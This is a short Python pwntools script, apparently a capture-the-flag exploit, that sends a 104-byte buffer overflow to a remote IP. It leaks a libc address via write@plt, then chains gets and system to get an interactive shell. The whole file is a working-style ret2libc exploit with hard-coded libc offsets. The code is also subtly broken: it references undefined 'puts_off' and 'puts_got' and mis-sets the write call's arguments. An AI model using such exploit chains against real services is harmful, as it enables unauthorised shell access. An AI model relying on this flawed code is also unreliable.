#!/usr/bin/env python

from pwn import *

r = remote('140.112.29.41', 8888)
# r = remote('csie.ctf.tw', 10114)
print '1'
main = 0x804855c
write_plt = 0x080483e0
write_got = 0x08048380

write_off = 0x000314d0     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
system_off = 0x0003fc40
gets_off = 0x00064ae0
print '2'
r.send('A'*104 + 
    p32(write_plt) + p32(main) + p32(write_got) + '\n')
# # r.send('A'*104 + 
#     p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')
print '3'
base = u32(r.recvline()[:4]) - puts_off
print '4'
print 'libc base =', hex(base)

system = base + system_off
gets = base + gets_off 

r.send('A'*104 + 
    p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')

r.interactive()
